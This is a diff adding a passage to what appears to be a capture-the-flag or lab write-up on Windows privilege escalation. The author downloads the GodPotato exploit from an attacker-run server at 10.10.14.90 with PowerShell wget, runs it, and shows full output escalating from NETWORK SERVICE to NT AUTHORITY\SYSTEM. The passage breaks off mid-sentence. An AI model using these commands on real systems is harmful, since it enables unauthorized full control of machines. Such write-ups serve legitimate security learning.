@@ -533,5 +533,48 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 ```python
+PS C:\Users\sqlsvc\Documents> wget http://10.10.14.90:8000/GodPotato-NET4.exe -o godpotato.exe
+PS C:\Users\sqlsvc\Documents> dir
+
+
+    Directory: C:\Users\sqlsvc\Documents
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       16/04/2026     18:36          57344 godpotato.exe                                                         
+
 
 ```
+I now have godpotato
+
+```python
+PS C:\Users\sqlsvc\Documents> ./godpotato.exe -cmd 'cmd /c whoami'
+[*] CombaseModule: 0x140711283916800
+[*] DispatchTable: 0x140711286222912
+[*] UseProtseqFunction: 0x140711285599440
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\72f4f138-45f8-4af2-9662-dfdce1f29e45\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00005402-05fc-ffff-4a6b-64ffb3f6d85c
+[*] DCOM obj OXID: 0x494073d84e44df89
+[*] DCOM obj OID: 0x21b9e6f2dc8441d4
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 900 Token:0x620  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 2008
+nt authority\system
+```
+I am now nt authority system but ill try 
